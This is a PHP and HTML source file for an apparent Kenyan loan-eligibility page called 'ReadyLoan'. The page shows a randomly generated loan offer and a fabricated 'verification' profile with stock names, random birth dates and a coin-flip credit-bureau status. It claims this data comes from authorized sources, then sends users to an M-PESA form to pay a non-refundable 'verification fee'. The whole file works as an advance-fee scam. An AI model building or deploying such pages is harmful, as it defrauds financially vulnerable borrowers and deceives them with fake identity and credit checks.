<?php
session_start();

// ================================
// ✅ CONFIG
// ================================
$MAX_ATTEMPTS = 30; // ❗ Change this to any limit you want

// ================================
// ✅ GET USER INPUT
// ================================
$user_identity = trim($_POST['user_identity'] ?? '');
$loan_type = $_POST['loan_type'] ?? 'Personal';

$phone_number = null;
$id_number = null;

// ================================
// ✅ DETECT PHONE OR ID
// ================================
if (preg_match('/^\d{10}$/', $user_identity)) {
    if ($user_identity[0] === '0') {
        $phone_number = '254' . substr($user_identity, 1);
    } elseif ($user_identity[0] === '7') {
        $phone_number = '254' . $user_identity;
    } else {
        die("Invalid phone number.");
    }

} elseif (preg_match('/^\d{8}$/', $user_identity)) {
    $id_number = $user_identity;

} else {
    die("Enter valid Phone or ID.");
}

// ✅ UNIQUE USER KEY (ID preferred)
$user_key = $id_number ?? $phone_number;

// ================================
// ✅ LOAD ATTEMPT COUNTER
// ================================
$attempts_file = 'attempts.json';
$attempts_data = file_exists($attempts_file)
    ? json_decode(file_get_contents($attempts_file), true)
    : [];

$current_attempts = $attempts_data[$user_key] ?? 0;

// ❌ BLOCK IF LIMIT REACHED
if ($current_attempts >= $MAX_ATTEMPTS) {
    die("❌ Too many attempts. Please try again later.");
}

// ✅ INCREMENT ATTEMPT
$attempts_data[$user_key] = $current_attempts + 1;
file_put_contents($attempts_file, json_encode($attempts_data, JSON_PRETTY_PRINT));

// ================================
// ✅ LOAD OR LOCK LOAN MEMORY
// ================================
$memory_file = 'loan_memory.json';

$loan_memory = file_exists($memory_file)
    ? json_decode(file_get_contents($memory_file), true)
    : [];

// ✅ IF USER EXISTS → REUSE OLD VALUES
if (isset($loan_memory[$user_key])) {

    $loan_amount = $loan_memory[$user_key]['loan_amount'];
    $verification_fee = $loan_memory[$user_key]['verification_fee'];

} else {

    // ✅ GENERATE NEW ONLY ONCE
    $loan_amount = rand(10000, 100000);
    $verification_fee = rand(10, 12);

    $loan_memory[$user_key] = [
        "loan_amount" => $loan_amount,
        "verification_fee" => $verification_fee
    ];

    // ✅ SAVE FOREVER
    file_put_contents($memory_file, json_encode($loan_memory, JSON_PRETTY_PRINT));
}

// ================================
// ✅ TRACKING ID
// ================================
$tracking_id = "LON-" . strtoupper(bin2hex(random_bytes(4)));

// ================================
// ✅ DUMMY SPINMOBILE KYC
// ================================
$kyc = [
    "full_name" => ["John Mwangi", "Mary Wanjiku", "Brian Otieno", "Grace Chebet"][rand(0, 3)],
    "dob" => rand(1985, 2003) . "-0" . rand(1,9) . "-" . rand(10,28),
    "gender" => rand(0,1) ? "Male" : "Female",
    "county" => ["Nairobi", "Kiambu", "Kisumu", "Nakuru", "Machakos"][rand(0,4)],
    "crb_status" => rand(0,1) ? "Good Standing" : "Listed",
    "phone_verified" => $phone_number ?? "2547" . rand(10000000, 99999999)
];

// ✅ First name extraction
$first_name = explode(' ', $kyc['full_name'])[0];

// ✅ Time-based greeting
$hour = date("H");
if ($hour < 12) {
    $greeting = "Good Morning";
} elseif ($hour < 18) {
    $greeting = "Good Afternoon";
} else {
    $greeting = "Good Evening";
}

// ✅ Gender-based title
$title = $kyc['gender'] === 'Male' ? 'Mr' : 'Ms';

// ✅ Final personalized message
$personal_greeting = "$greeting $title $first_name 👋";

// ================================
// ✅ SAVE SESSION
// ================================
$_SESSION['tracking_id'] = $tracking_id;
$_SESSION['phone_number'] = $phone_number;
$_SESSION['id_number'] = $id_number;
$_SESSION['loan_amount'] = $loan_amount;
$_SESSION['verification_fee'] = $verification_fee;
$_SESSION['loan_type'] = $loan_type;
$_SESSION['kyc'] = $kyc;
$_SESSION['attempts_left'] = $MAX_ATTEMPTS - $attempts_data[$user_key];

$_SESSION['first_name'] = $first_name;
$_SESSION['personal_greeting'] = $personal_greeting;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loan Eligibility Result</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- ✅ Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- ✅ Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

    <style>
        body {
            background: linear-gradient(120deg, #1d3557, #457b9d);
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
        }
        .card {
            border-radius: 15px;
        }
        .badge {
            font-size: 14px;
        }
        .glow {
            box-shadow: 0 0 25px rgba(0,0,0,0.2);
        }
        .disclaimer {
            font-size: 13px;
            color: #6c757d;
        }
    </style>
</head>

<body>
<div class="container py-5">

    <!-- ✅ PERSONALIZED GREETING + ELIGIBILITY -->
    <div class="row justify-content-center mb-4">
        <div class="col-md-8">
            <div class="card text-center glow">
                <div class="card-body py-4">
                    <h4>
                        <?= htmlspecialchars($_SESSION['personal_greeting']); ?> — 
                        here’s your eligibility result 🎉
                    </h4>

                    <p class="text-muted">
                        Reference ID: <strong><?= htmlspecialchars($_SESSION['tracking_id']); ?></strong>
                    </p>

                    <p class="mb-1">Based on your details and verification, you may be eligible for loan offers of up to:</p>

                    <h1 class="text-success fw-bold mb-2">
                        KES <?= number_format($_SESSION['loan_amount']); ?>
                    </h1>

                    <p>
                        If approved by a lending partner, funds would be disbursed to your 
                        <strong><?= $_SESSION['phone_number'] ? htmlspecialchars($_SESSION['phone_number']) : 'verified mobile number'; ?></strong>.
                    </p>

                    <div class="mb-2">
                        <span class="badge bg-primary">Estimated Tenure: 12 Months</span>
                        <span class="badge bg-success">Representative Interest: 10%</span>
                        <span class="badge bg-warning text-dark">No Guarantor Required to Check</span>
                    </div>

                    <p class="disclaimer mt-3">
                        This is an <strong>eligibility estimate</strong> only. Final loan approval, amount and terms are
                        determined solely by independent licensed lenders.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <!-- ✅ KYC SECTION -->
    <div class="row justify-content-center mb-4">
        <div class="col-md-8">
            <div class="card glow">
                <div class="card-header bg-dark text-white">
                    🔐 Applicant Verification Snapshot
                </div>
                <div class="card-body">
                    <table class="table table-bordered mb-0">
                        <tr>
                            <th>Full Name</th>
                            <td><?= htmlspecialchars($_SESSION['kyc']['full_name']); ?></td>
                        </tr>
                        <tr>
                            <th>Date of Birth</th>
                            <td><?= htmlspecialchars($_SESSION['kyc']['dob']); ?></td>
                        </tr>
                        <tr>
                            <th>Gender</th>
                            <td><?= htmlspecialchars($_SESSION['kyc']['gender']); ?></td>
                        </tr>
                        <tr>
                            <th>County</th>
                            <td><?= htmlspecialchars($_SESSION['kyc']['county']); ?></td>
                        </tr>
                        <tr>
                            <th>CRB Status</th>
                            <td>
                                <span class="badge bg-<?= $_SESSION['kyc']['crb_status'] == 'Good Standing' ? 'success' : 'danger'; ?>">
                                    <?= htmlspecialchars($_SESSION['kyc']['crb_status']); ?>
                                </span>
                            </td>
                        </tr>
                        <tr>
                            <th>Verified Phone</th>
                            <td><?= htmlspecialchars($_SESSION['kyc']['phone_verified']); ?></td>
                        </tr>
                    </table>
                    <p class="disclaimer mt-2 mb-0">
                        Verification data is generated from authorized sources and may be used by partner lenders
                        when assessing your loan application.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <!-- ✅ PAYMENT SECTION (CRB / VERIFICATION FEE) -->
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card glow text-center">
                <div class="card-body py-4">
                    <h5>CRB & Identity Verification Fee</h5>
                    <h2 class="text-danger fw-bold">
                        KES <?= number_format($_SESSION['verification_fee']); ?>
                    </h2>

                    <p class="disclaimer mb-3">
                        This one-time fee covers official credit bureau (CRB) and identity verification.
                        It does <strong>not</strong> guarantee loan approval or disbursement, but is required
                        before full results and potential offers are finalized.
                    </p>

                    <!-- ✅ REDIRECTS TO MPESA PAYMENT FORM -->
                    <form action="/mpesa" method="POST">

                        <div class="form-check my-3 text-start">
                            <input class="form-check-input" type="checkbox" required id="termsCheck">
                            <label class="form-check-label" for="termsCheck">
                                I understand and agree that this fee is for CRB & identity verification only and
                                does not guarantee loan approval. I accept the 
                                <a href="#" data-bs-toggle="modal" data-bs-target="#terms">Terms</a> 
                                & <a href="#" data-bs-toggle="modal" data-bs-target="#policy">Privacy Policy</a>.
                            </label>
                        </div>

                        <button type="submit" class="btn btn-lg btn-danger w-100">
                            ✅ Proceed to Secure M-PESA Payment
                        </button>
                    </form>

                </div>
            </div>
        </div>
    </div>

</div>

<!-- ✅ TERMS MODAL -->
<div class="modal fade" id="terms" tabindex="-1">
  <div class="modal-dialog"><div class="modal-content">
    <div class="modal-header">
        <h5 class="modal-title">Terms & Conditions</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
    <div class="modal-body">
        This platform provides credit bureau (CRB) and identity verification services and loan eligibility assessments.
        The verification fee is <strong>non-refundable</strong> and charged for processing your background checks.
        Loan approval, amounts, interest rates and repayment terms are determined exclusively by independent
        licensed financial institutions, not by ReadyLoan.
    </div>
  </div></div>
</div>

<!-- ✅ POLICY MODAL -->
<div class="modal fade" id="policy" tabindex="-1">
  <div class="modal-dialog"><div class="modal-content">
    <div class="modal-header">
        <h5 class="modal-title">Privacy Policy</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
    </div>
    <div class="modal-body">
        Your personal information is encrypted, securely stored and used only for CRB & identity verification
        and to help match you with potential lending partners. We do not sell your data to third parties.
    </div>
  </div></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
